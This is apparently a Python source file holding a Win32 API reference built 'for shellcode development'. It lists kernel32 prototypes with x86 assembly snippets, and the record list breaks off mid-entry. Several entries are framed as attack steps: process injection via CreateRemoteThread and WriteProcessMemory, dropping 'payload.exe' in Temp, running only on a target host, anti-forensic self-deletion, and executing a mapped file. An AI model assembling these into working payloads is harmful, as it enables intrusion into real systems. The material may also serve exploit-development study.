"""Static database of Win32 API records and struct layouts for shellcode development."""
from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class Argument:
    name: str
    type: str
    notes: str = ""


@dataclass
class APIRecord:
    module: str
    category: str
    prototype: str
    arguments: list[Argument]
    requires_structs: tuple[str, ...] = ()
    example: str = ""


@dataclass(frozen=True)
class StructField:
    offset: int
    name: str
    size: int
    notes: str = ""


@dataclass
class StructRecord:
    size: int
    alignment: int = 4
    fields: list[StructField] = field(default_factory=list)


@dataclass(frozen=True)
class ModuleInfo:
    dll: str
    load_via: str


API_DATABASE: dict[str, APIRecord] = {
    # --- kernel32.dll : process ---
    "WinExec": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype="UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow)",
        arguments=[
            Argument("lpCmdLine", "LPCSTR", "pointer to command string, e.g. cmd.exe"),
            Argument("uCmdShow", "UINT", "SW_SHOWNORMAL = 1 or SW_HIDE = 0"),
        ],
    ),
    "ExitProcess": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype="VOID ExitProcess(UINT uExitCode)",
        arguments=[
            Argument("uExitCode", "UINT", "0 for clean exit"),
        ],
    ),
    "CreateProcessA": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype=(
            "BOOL CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine,"
            " LPSECURITY_ATTRIBUTES lpProcessAttributes,"
            " LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles,"
            " DWORD dwCreationFlags, LPVOID lpEnvironment,"
            " LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,"
            " LPPROCESS_INFORMATION lpProcessInformation)"
        ),
        arguments=[
            Argument("lpApplicationName", "LPCSTR", "NULL; command in lpCommandLine"),
            Argument("lpCommandLine", "LPSTR", "pointer to cmd string, e.g. cmd.exe"),
            Argument("lpProcessAttributes", "LPSECURITY_ATTRIBUTES", "NULL"),
            Argument("lpThreadAttributes", "LPSECURITY_ATTRIBUTES", "NULL"),
            Argument("bInheritHandles", "BOOL", "TRUE for stdio redirection"),
            Argument("dwCreationFlags", "DWORD", "NULL"),
            Argument("lpEnvironment", "LPVOID", "NULL"),
            Argument("lpCurrentDirectory", "LPCSTR", "NULL"),
            Argument("lpStartupInfo", "LPSTARTUPINFOA", "cb=0x44, STARTF_USESTDHANDLES"),
            Argument("lpProcessInformation", "LPPROCESS_INFORMATION", "output; zero before call"),
        ],
        requires_structs=("STARTUPINFOA", "PROCESS_INFORMATION"),
    ),
    "CreateToolhelp32Snapshot": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype="HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID)",
        arguments=[
            Argument("dwFlags", "DWORD", "TH32CS_SNAPPROCESS = 0x02"),
            Argument("th32ProcessID", "DWORD", "0 for all processes"),
        ],
    ),
    "Process32First": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype="BOOL Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)",
        arguments=[
            Argument("hSnapshot", "HANDLE", "from CreateToolhelp32Snapshot"),
            Argument("lppe", "LPPROCESSENTRY32", "cb must be set to sizeof(PROCESSENTRY32)"),
        ],
        requires_structs=("PROCESSENTRY32",),
    ),
    "Process32Next": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype="BOOL Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)",
        arguments=[
            Argument("hSnapshot", "HANDLE", "from CreateToolhelp32Snapshot"),
            Argument("lppe", "LPPROCESSENTRY32", "reused from Process32First"),
        ],
        requires_structs=("PROCESSENTRY32",),
    ),
    "OpenProcess": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype="HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)",
        arguments=[
            Argument("dwDesiredAccess", "DWORD", "PROCESS_TERMINATE = 0x0001"),
            Argument("bInheritHandle", "BOOL", "FALSE"),
            Argument("dwProcessId", "DWORD", "from PROCESSENTRY32.th32ProcessID"),
        ],
    ),
    "TerminateProcess": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype="BOOL TerminateProcess(HANDLE hProcess, UINT uExitCode)",
        arguments=[
            Argument("hProcess", "HANDLE", "from OpenProcess"),
            Argument("uExitCode", "UINT", "0"),
        ],
    ),
    # --- kernel32.dll : filesystem ---
    "CopyFileA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="BOOL CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists)",
        arguments=[
            Argument("lpExistingFileName", "LPCSTR", ""),
            Argument("lpNewFileName", "LPCSTR", ""),
            Argument("bFailIfExists", "BOOL", "FALSE to overwrite"),
        ],
    ),
    "CopyFileExA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype=(
            "BOOL CopyFileExA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName,"
            " LPPROGRESS_ROUTINE lpProgressRoutine, LPVOID lpData,"
            " LPBOOL pbCancel, DWORD dwCopyFlags)"
        ),
        arguments=[
            Argument("lpExistingFileName", "LPCSTR", ""),
            Argument("lpNewFileName", "LPCSTR", ""),
            Argument("lpProgressRoutine", "LPPROGRESS_ROUTINE", "NULL"),
            Argument("lpData", "LPVOID", "NULL"),
            Argument("pbCancel", "LPBOOL", "NULL"),
            Argument("dwCopyFlags", "DWORD", "0; or COPY_FILE_ALLOW_DECRYPTED_DESTINATION = 0x8"),
        ],
    ),
    "CreateDirectoryA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="BOOL CreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes)",
        arguments=[
            Argument("lpPathName", "LPCSTR", "directory path to create"),
            Argument("lpSecurityAttributes", "LPSECURITY_ATTRIBUTES", "NULL for default security"),
        ],
    ),
    "GetFileAttributesA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="DWORD GetFileAttributesA(LPCSTR lpFileName)",
        arguments=[
            Argument("lpFileName", "LPCSTR", "path to check"),
        ],
    ),
    "SetFileAttributesA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="BOOL SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes)",
        arguments=[
            Argument("lpFileName", "LPCSTR", ""),
            Argument("dwFileAttributes", "DWORD",
                     "FILE_ATTRIBUTE_HIDDEN=0x02, FILE_ATTRIBUTE_SYSTEM=0x04, "
                     "FILE_ATTRIBUTE_NORMAL=0x80"),
        ],
    ),
    "DeleteFileA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="BOOL DeleteFileA(LPCSTR lpPathName)",
        arguments=[
            Argument("lpPathName", "LPCSTR", ""),
        ],
    ),
    "MoveFileA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="BOOL MoveFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName)",
        arguments=[
            Argument("lpExistingFileName", "LPCSTR", ""),
            Argument("lpNewFileName", "LPCSTR", ""),
        ],
    ),
    "CreateFileA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype=(
            "HANDLE CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess,"
            " DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,"
            " DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,"
            " HANDLE hTemplateFile)"
        ),
        arguments=[
            Argument("lpFileName", "LPCSTR", ""),
            Argument("dwDesiredAccess", "DWORD", "GENERIC_READ=0x80000000, GENERIC_WRITE=0x40000000"),
            Argument("dwShareMode", "DWORD", "0 for exclusive"),
            Argument("lpSecurityAttributes", "LPSECURITY_ATTRIBUTES", "NULL"),
            Argument("dwCreationDisposition", "DWORD", "OPEN_EXISTING=3, CREATE_ALWAYS=2"),
            Argument("dwFlagsAndAttributes", "DWORD", "FILE_ATTRIBUTE_NORMAL=0x80"),
            Argument("hTemplateFile", "HANDLE", "NULL"),
        ],
    ),
    # --- kernel32.dll : library ---
    "LoadLibraryA": APIRecord(
        module="kernel32.dll",
        category="library",
        prototype="HMODULE LoadLibraryA(LPCSTR lpLibFileName)",
        arguments=[
            Argument("lpLibFileName", "LPCSTR", "e.g. ws2_32.dll"),
        ],
    ),
    "GetProcAddress": APIRecord(
        module="kernel32.dll",
        category="library",
        prototype="FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName)",
        arguments=[
            Argument("hModule", "HMODULE", "base address of loaded module"),
            Argument("lpProcName", "LPCSTR", "function name string"),
        ],
    ),
    "GetModuleHandleA": APIRecord(
        module="kernel32.dll",
        category="library",
        prototype="HMODULE GetModuleHandleA(LPCSTR lpModuleName)",
        arguments=[
            Argument("lpModuleName", "LPCSTR", "NULL returns base of current process; or e.g. kernel32.dll"),
        ],
    ),
    # --- kernel32.dll : memory ---
    "VirtualAlloc": APIRecord(
        module="kernel32.dll",
        category="memory",
        prototype=(
            "LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize,"
            " DWORD flAllocationType, DWORD flProtect)"
        ),
        arguments=[
            Argument("lpAddress", "LPVOID", "NULL to let OS choose; or preferred address"),
            Argument("dwSize", "SIZE_T", "size of region in bytes"),
            Argument("flAllocationType", "DWORD", "MEM_COMMIT|MEM_RESERVE = 0x3000"),
            Argument("flProtect", "DWORD", "PAGE_EXECUTE_READWRITE = 0x40"),
        ],
    ),
    "VirtualAllocEx": APIRecord(
        module="kernel32.dll",
        category="memory",
        prototype=(
            "LPVOID VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress,"
            " SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)"
        ),
        arguments=[
            Argument("hProcess", "HANDLE", "target process handle from OpenProcess"),
            Argument("lpAddress", "LPVOID", "NULL to let OS choose"),
            Argument("dwSize", "SIZE_T", "size of region in bytes"),
            Argument("flAllocationType", "DWORD", "MEM_COMMIT|MEM_RESERVE = 0x3000"),
            Argument("flProtect", "DWORD", "PAGE_EXECUTE_READWRITE = 0x40"),
        ],
    ),
    "WriteProcessMemory": APIRecord(
        module="kernel32.dll",
        category="memory",
        prototype=(
            "BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress,"
            " LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)"
        ),
        arguments=[
            Argument("hProcess", "HANDLE", "target process handle"),
            Argument("lpBaseAddress", "LPVOID", "address in target process from VirtualAllocEx"),
            Argument("lpBuffer", "LPCVOID", "local buffer to write from"),
            Argument("nSize", "SIZE_T", "number of bytes to write"),
            Argument("lpNumberOfBytesWritten", "SIZE_T*", "NULL or pointer to SIZE_T"),
        ],
    ),
    "CreateRemoteThread": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype=(
            "HANDLE CreateRemoteThread(HANDLE hProcess,"
            " LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,"
            " LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,"
            " DWORD dwCreationFlags, LPDWORD lpThreadId)"
        ),
        arguments=[
            Argument("hProcess", "HANDLE", "target process handle"),
            Argument("lpThreadAttributes", "LPSECURITY_ATTRIBUTES", "NULL"),
            Argument("dwStackSize", "SIZE_T", "0 for default"),
            Argument("lpStartAddress", "LPTHREAD_START_ROUTINE", "LoadLibraryA address in target"),
            Argument("lpParameter", "LPVOID", "remote buffer with DLL path"),
            Argument("dwCreationFlags", "DWORD", "0 to run immediately"),
            Argument("lpThreadId", "LPDWORD", "NULL"),
        ],
    ),
    "VirtualProtect": APIRecord(
        module="kernel32.dll",
        category="memory",
        prototype=(
            "BOOL VirtualProtect(LPVOID lpAddress, SIZE_T dwSize,"
            " DWORD flNewProtect, PDWORD lpflOldProtect)"
        ),
        arguments=[
            Argument("lpAddress", "LPVOID", "base of region to change"),
            Argument("dwSize", "SIZE_T", "size in bytes"),
            Argument("flNewProtect", "DWORD", "PAGE_EXECUTE_READ = 0x20; PAGE_EXECUTE_READWRITE = 0x40"),
            Argument("lpflOldProtect", "PDWORD", "pointer to DWORD for old protection; use a scratch slot"),
        ],
    ),
    # --- kernel32.dll : process ---
    "CreateThread": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype=(
            "HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,"
            " SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,"
            " LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)"
        ),
        arguments=[
            Argument("lpThreadAttributes", "LPSECURITY_ATTRIBUTES", "NULL"),
            Argument("dwStackSize", "SIZE_T", "0 for default"),
            Argument("lpStartAddress", "LPTHREAD_START_ROUTINE", "pointer to shellcode or function"),
            Argument("lpParameter", "LPVOID", "NULL or pointer to argument"),
            Argument("dwCreationFlags", "DWORD", "0 to run immediately"),
            Argument("lpThreadId", "LPDWORD", "NULL; output thread ID, unused in shellcode"),
        ],
    ),
    "GetLastError": APIRecord(
        module="kernel32.dll",
        category="process",
        prototype="DWORD GetLastError(void)",
        arguments=[],
    ),
    # --- kernel32.dll : synchronization ---
    "Sleep": APIRecord(
        module="kernel32.dll",
        category="synchronization",
        prototype="void Sleep(DWORD dwMilliseconds)",
        arguments=[
            Argument("dwMilliseconds", "DWORD", "delay in milliseconds"),
        ],
    ),
    "WaitForSingleObject": APIRecord(
        module="kernel32.dll",
        category="synchronization",
        prototype="DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)",
        arguments=[
            Argument("hHandle", "HANDLE", "thread or process handle to wait on"),
            Argument("dwMilliseconds", "DWORD", "INFINITE = 0xFFFFFFFF; or timeout in ms"),
        ],
    ),
    "CloseHandle": APIRecord(
        module="kernel32.dll",
        category="synchronization",
        prototype="BOOL CloseHandle(HANDLE hObject)",
        arguments=[
            Argument("hObject", "HANDLE", "handle to close; returns nonzero on success"),
        ],
    ),
    # --- kernel32.dll : pipe ---
    "CreatePipe": APIRecord(
        module="kernel32.dll",
        category="pipe",
        prototype=(
            "BOOL CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe,"
            " LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize)"
        ),
        arguments=[
            Argument("hReadPipe", "PHANDLE", "pointer to HANDLE for read end"),
            Argument("hWritePipe", "PHANDLE", "pointer to HANDLE for write end"),
            Argument("lpPipeAttributes", "LPSECURITY_ATTRIBUTES", "set bInheritHandle=TRUE for child inheritance"),
            Argument("nSize", "DWORD", "0 for default buffer size"),
        ],
        example=(
            "; Create anonymous pipe for child process stdout capture\n"
            "; Build SECURITY_ATTRIBUTES on stack: nLength=12, bInheritHandle=TRUE, lpSD=NULL\n"
            "push 0                        ; lpSecurityDescriptor = NULL\n"
            "push 1                        ; bInheritHandle = TRUE\n"
            "push 12                       ; nLength = sizeof(SECURITY_ATTRIBUTES)\n"
            "mov esi, esp                  ; esi -> SECURITY_ATTRIBUTES\n"
            "push 0                        ; nSize = default\n"
            "push esi                      ; lpPipeAttributes\n"
            "lea eax, [ebp-write_pipe]\n"
            "push eax                      ; hWritePipe\n"
            "lea eax, [ebp-read_pipe]\n"
            "push eax                      ; hReadPipe\n"
            "call [ebp-CreatePipe]\n"
            "; Now set STARTUPINFO.hStdOutput and hStdError to write_pipe handle\n"
            "; and hStdInput to read_pipe handle for the child process"
        ),
    ),
    "PeekNamedPipe": APIRecord(
        module="kernel32.dll",
        category="pipe",
        prototype=(
            "BOOL PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer,"
            " DWORD nBufferSize, LPDWORD lpBytesRead,"
            " LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage)"
        ),
        arguments=[
            Argument("hNamedPipe", "HANDLE", "read end of pipe from CreatePipe"),
            Argument("lpBuffer", "LPVOID", "NULL to just check availability"),
            Argument("nBufferSize", "DWORD", "0 if lpBuffer is NULL"),
            Argument("lpBytesRead", "LPDWORD", "NULL"),
            Argument("lpTotalBytesAvail", "LPDWORD", "pointer to DWORD; nonzero means data ready"),
            Argument("lpBytesLeftThisMessage", "LPDWORD", "NULL"),
        ],
        example=(
            "; Check if child process has written output to the pipe\n"
            "push 0                        ; lpBytesLeftThisMessage = NULL\n"
            "lea eax, [ebp-avail_bytes]\n"
            "push eax                      ; lpTotalBytesAvail\n"
            "push 0                        ; lpBytesRead = NULL\n"
            "push 0                        ; nBufferSize = 0 (just checking)\n"
            "push 0                        ; lpBuffer = NULL\n"
            "push [ebp-read_pipe]          ; hNamedPipe\n"
            "call [ebp-PeekNamedPipe]\n"
            "cmp dword [ebp-avail_bytes], 0\n"
            "je no_data_yet                ; loop or sleep if no output yet\n"
            "; Data available: now call ReadFile with the pipe handle"
        ),
    ),
    # --- kernel32.dll : environment ---
    "GetEnvironmentVariableA": APIRecord(
        module="kernel32.dll",
        category="environment",
        prototype="DWORD GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize)",
        arguments=[
            Argument("lpName", "LPCSTR", "variable name, e.g. TEMP, USERPROFILE, COMPUTERNAME"),
            Argument("lpBuffer", "LPSTR", "buffer receiving value"),
            Argument("nSize", "DWORD", "size of buffer in chars; MAX_PATH = 260"),
        ],
        example=(
            "; Resolve %TEMP% to build a drop path (alternative to GetTempPathA)\n"
            "push 260                      ; nSize = MAX_PATH\n"
            "lea eax, [ebp-path_buf]\n"
            "push eax                      ; lpBuffer\n"
            "lea eax, [ebp-str_TEMP]       ; \"TEMP\" constructed on stack\n"
            "push eax                      ; lpName\n"
            "call [ebp-GetEnvironmentVariableA]\n"
            "test eax, eax                 ; returns char count, 0 = not found\n"
            "; eax > 0: path_buf contains e.g. C:\\Users\\admin\\AppData\\Local\\Temp\n"
            "; Now lstrcatA to append \\payload.exe"
        ),
    ),
    "SetCurrentDirectoryA": APIRecord(
        module="kernel32.dll",
        category="environment",
        prototype="BOOL SetCurrentDirectoryA(LPCSTR lpPathName)",
        arguments=[
            Argument("lpPathName", "LPCSTR", "new current directory path"),
        ],
        example=(
            "; Change CWD so relative-path drops land in target directory\n"
            "lea eax, [ebp-str_target_dir] ; e.g. \"C:\\Users\\Public\"\n"
            "push eax                      ; lpPathName\n"
            "call [ebp-SetCurrentDirectoryA]\n"
            "; Now CreateFileA(\"payload.exe\", ...) writes to C:\\Users\\Public\\payload.exe"
        ),
    ),
    "GetComputerNameA": APIRecord(
        module="kernel32.dll",
        category="identity",
        prototype="BOOL GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize)",
        arguments=[
            Argument("lpBuffer", "LPSTR", "buffer receiving computer name"),
            Argument("nSize", "LPDWORD", "pointer to DWORD: in=buffer size, out=chars copied excluding null"),
        ],
        example=(
            "; Get hostname for conditional execution (only run on target machine)\n"
            "mov dword [ebp-name_size], 16 ; MAX_COMPUTERNAME_LENGTH + 1\n"
            "lea eax, [ebp-name_size]\n"
            "push eax                      ; nSize\n"
            "lea eax, [ebp-comp_name]\n"
            "push eax                      ; lpBuffer\n"
            "call [ebp-GetComputerNameA]\n"
            "; Compare comp_name against target hostname with lstrcmpA or byte-by-byte"
        ),
    ),
    # --- kernel32.dll : directory listing ---
    "FindFirstFileA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="HANDLE FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)",
        arguments=[
            Argument("lpFileName", "LPCSTR", "search pattern, e.g. C:\\Users\\Public\\*.txt"),
            Argument("lpFindFileData", "LPWIN32_FIND_DATAA", "pointer to WIN32_FIND_DATAA struct (0x140 bytes)"),
        ],
        requires_structs=("WIN32_FIND_DATAA",),
        example=(
            "; Search for *.txt files on the Desktop\n"
            "lea eax, [ebp-find_data]      ; WIN32_FIND_DATAA (0x140 bytes)\n"
            "push eax                      ; lpFindFileData\n"
            "lea eax, [ebp-str_pattern]    ; \"C:\\Users\\Public\\Desktop\\*.txt\"\n"
            "push eax                      ; lpFileName\n"
            "call [ebp-FindFirstFileA]\n"
            "cmp eax, 0xFFFFFFFF           ; INVALID_HANDLE_VALUE = no matches\n"
            "je no_files_found\n"
            "mov [ebp-search_handle], eax\n"
            "; Filename is at [ebp-find_data+0x2C] (cFileName, MAX_PATH chars)"
        ),
    ),
    "FindNextFileA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="BOOL FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)",
        arguments=[
            Argument("hFindFile", "HANDLE", "search handle from FindFirstFileA"),
            Argument("lpFindFileData", "LPWIN32_FIND_DATAA", "pointer to WIN32_FIND_DATAA struct"),
        ],
        requires_structs=("WIN32_FIND_DATAA",),
        example=(
            "; Iterate to next matching file\n"
            "find_loop:\n"
            "  lea eax, [ebp-find_data]\n"
            "  push eax                    ; lpFindFileData (reused)\n"
            "  push [ebp-search_handle]    ; hFindFile\n"
            "  call [ebp-FindNextFileA]\n"
            "  test eax, eax\n"
            "  jz done_searching           ; 0 = no more files\n"
            "  ; Process [ebp-find_data+0x2C] (cFileName)\n"
            "  jmp find_loop"
        ),
    ),
    "FindClose": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="BOOL FindClose(HANDLE hFindFile)",
        arguments=[
            Argument("hFindFile", "HANDLE", "search handle from FindFirstFileA"),
        ],
        example=(
            "; Release search handle when done iterating\n"
            "push [ebp-search_handle]\n"
            "call [ebp-FindClose]"
        ),
    ),
    # --- kernel32.dll : filesystem (MoveFileExA) ---
    "MoveFileExA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="BOOL MoveFileExA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD dwFlags)",
        arguments=[
            Argument("lpExistingFileName", "LPCSTR", "source path"),
            Argument("lpNewFileName", "LPCSTR", "destination path; NULL with MOVEFILE_DELAY_UNTIL_REBOOT to delete on reboot"),
            Argument("dwFlags", "DWORD", "MOVEFILE_REPLACE_EXISTING=0x01, MOVEFILE_DELAY_UNTIL_REBOOT=0x04"),
        ],
        example=(
            "; Move file with overwrite, or schedule delete-on-reboot\n"
            "; Example 1: Move and replace\n"
            "push 0x01                     ; MOVEFILE_REPLACE_EXISTING\n"
            "lea eax, [ebp-str_dst_path]\n"
            "push eax                      ; lpNewFileName\n"
            "lea eax, [ebp-str_src_path]\n"
            "push eax                      ; lpExistingFileName\n"
            "call [ebp-MoveFileExA]\n"
            "\n"
            "; Example 2: Schedule self-delete on reboot (anti-forensics)\n"
            "push 0x04                     ; MOVEFILE_DELAY_UNTIL_REBOOT\n"
            "push 0                        ; lpNewFileName = NULL (delete)\n"
            "lea eax, [ebp-str_self_path]\n"
            "push eax                      ; lpExistingFileName\n"
            "call [ebp-MoveFileExA]"
        ),
    ),
    # --- kernel32.dll : filesystem (file size) ---
    "GetFileSize": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="DWORD GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)",
        arguments=[
            Argument("hFile", "HANDLE", "handle from CreateFileA"),
            Argument("lpFileSizeHigh", "LPDWORD", "NULL for files under 4GB"),
        ],
        example=(
            "; Get file size to know how much to allocate for ReadFile\n"
            "push 0                        ; lpFileSizeHigh = NULL\n"
            "push [ebp-file_handle]        ; hFile from CreateFileA\n"
            "call [ebp-GetFileSize]\n"
            "cmp eax, 0xFFFFFFFF           ; INVALID_FILE_SIZE on error\n"
            "je read_error\n"
            "mov [ebp-file_size], eax      ; save for VirtualAlloc + ReadFile"
        ),
    ),
    # --- kernel32.dll : memory (memory-mapped files) ---
    "CreateFileMappingA": APIRecord(
        module="kernel32.dll",
        category="memory",
        prototype=(
            "HANDLE CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes,"
            " DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow,"
            " LPCSTR lpName)"
        ),
        arguments=[
            Argument("hFile", "HANDLE", "file handle from CreateFileA; INVALID_HANDLE_VALUE for pagefile-backed"),
            Argument("lpFileMappingAttributes", "LPSECURITY_ATTRIBUTES", "NULL"),
            Argument("flProtect", "DWORD", "PAGE_READONLY=0x02, PAGE_READWRITE=0x04, PAGE_EXECUTE_READ=0x20"),
            Argument("dwMaximumSizeHigh", "DWORD", "0 for files under 4GB"),
            Argument("dwMaximumSizeLow", "DWORD", "0 to use file size; or explicit size for pagefile-backed"),
            Argument("lpName", "LPCSTR", "NULL for unnamed mapping"),
        ],
        example=(
            "; Map a dropped file into memory as executable (alternative to ReadFile + VirtualAlloc)\n"
            "; Step 1: Open file\n"
            "push 0                        ; hTemplateFile\n"
            "push 0x80                     ; FILE_ATTRIBUTE_NORMAL\n"
            "push 3                        ; OPEN_EXISTING\n"
            "push 0                        ; lpSecurityAttributes\n"
            "push 0                        ; dwShareMode\n"
            "push 0x80000000               ; GENERIC_READ\n"
            "lea eax, [ebp-str_file_path]\n"
            "push eax\n"
            "call [ebp-CreateFileA]\n"
            "mov [ebp-file_handle], eax\n"
            "\n"
            "; Step 2: Create mapping with execute permission\n"
            "push 0                        ; lpName = NULL\n"
            "push 0                        ; dwMaximumSizeLow = 0 (use file size)\n"
            "push 0                        ; dwMaximumSizeHigh = 0\n"
            "push 0x20                     ; PAGE_EXECUTE_READ\n"
            "push 0                        ; lpFileMappingAttributes = NULL\n"
            "push [ebp-file_handle]\n"
            "call [ebp-CreateFileMappingA]\n"
            "mov [ebp-mapping_handle], eax"
        ),
    ),
    "MapViewOfFile": APIRecord(
        module="kernel32.dll",
        category="memory",
        prototype=(
            "LPVOID MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess,"
            " DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)"
        ),
        arguments=[
            Argument("hFileMappingObject", "HANDLE", "from CreateFileMappingA"),
            Argument("dwDesiredAccess", "DWORD", "FILE_MAP_READ=0x04, FILE_MAP_WRITE=0x02, FILE_MAP_EXECUTE=0x20"),
            Argument("dwFileOffsetHigh", "DWORD", "0"),
            Argument("dwFileOffsetLow", "DWORD", "0 for start of file"),
            Argument("dwNumberOfBytesToMap", "SIZE_T", "0 to map entire file"),
        ],
        example=(
            "; Map the file into memory and execute it\n"
            "push 0                        ; dwNumberOfBytesToMap = 0 (entire file)\n"
            "push 0                        ; dwFileOffsetLow\n"
            "push 0                        ; dwFileOffsetHigh\n"
            "push 0x24                     ; FILE_MAP_READ | FILE_MAP_EXECUTE\n"
            "push [ebp-mapping_handle]     ; hFileMappingObject\n"
            "call [ebp-MapViewOfFile]\n"
            "test eax, eax\n"
            "jz map_failed\n"
            "mov [ebp-mapped_base], eax    ; base address of mapped file\n"
            "; Can now CreateThread with mapped_base as lpStartAddress"
        ),
    ),
    "UnmapViewOfFile": APIRecord(
        module="kernel32.dll",
        category="memory",
        prototype="BOOL UnmapViewOfFile(LPCVOID lpBaseAddress)",
        arguments=[
            Argument("lpBaseAddress", "LPCVOID", "base address from MapViewOfFile"),
        ],
        example=(
            "; Clean up after execution\n"
            "push [ebp-mapped_base]\n"
            "call [ebp-UnmapViewOfFile]\n"
            "push [ebp-mapping_handle]\n"
            "call [ebp-CloseHandle]\n"
            "push [ebp-file_handle]\n"
            "call [ebp-CloseHandle]"
        ),
    ),
    # --- kernel32.dll : filesystem (additional) ---
    "ReadFile": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype=(
            "BOOL ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead,"
            " LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)"
        ),
        arguments=[
            Argument("hFile", "HANDLE", "handle from CreateFileA"),
            Argument("lpBuffer", "LPVOID", "pointer to destination buffer"),
            Argument("nNumberOfBytesToRead", "DWORD", "number of bytes to read"),
            Argument("lpNumberOfBytesRead", "LPDWORD", "pointer to DWORD for bytes read; NULL if lpOverlapped set"),
            Argument("lpOverlapped", "LPOVERLAPPED", "NULL for synchronous I/O"),
        ],
    ),
    "WriteFile": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype=(
            "BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,"
            " LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)"
        ),
        arguments=[
            Argument("hFile", "HANDLE", "handle from CreateFileA"),
            Argument("lpBuffer", "LPCVOID", "pointer to source buffer"),
            Argument("nNumberOfBytesToWrite", "DWORD", "number of bytes to write"),
            Argument("lpNumberOfBytesWritten", "LPDWORD", "pointer to DWORD for bytes written; NULL if lpOverlapped set"),
            Argument("lpOverlapped", "LPOVERLAPPED", "NULL for synchronous I/O"),
        ],
    ),
    "GetTempPathA": APIRecord(
        module="kernel32.dll",
        category="filesystem",
        prototype="DWORD GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer)",
        arguments=[
            Argument("nBufferLength", "DWORD", "size of lpBuffer in chars; MAX_PATH = 260"),
            Argument("lpBuffer", "LPSTR", "pointer to buffer that receives temp path"),
        ],
    ),
    # --- kernel32.dll : string ---
    "lstrcpyA": APIRecord(
        module="kernel32.dll",
        category="string",
        prototype="LPSTR lstrcpyA(LPSTR lpString1, LPCSTR lpString2)",
        arguments=[
            Argument("lpString1", "LPSTR", "destination buffer"),
            Argument("lpString2", "LPCSTR", "source string"),
        ],
    ),
    "lstrlenA": APIRecord(
        module="kernel32.dll",
        category="string",
        prototype="int lstrlenA(LPCSTR lpString)",
        arguments=[
            Argument("lpString", "LPCSTR", "pointer to null-terminated string"),
        ],
    ),
    "lstrcatA": APIRecord(
        module="kernel32.dll",
        category="string",
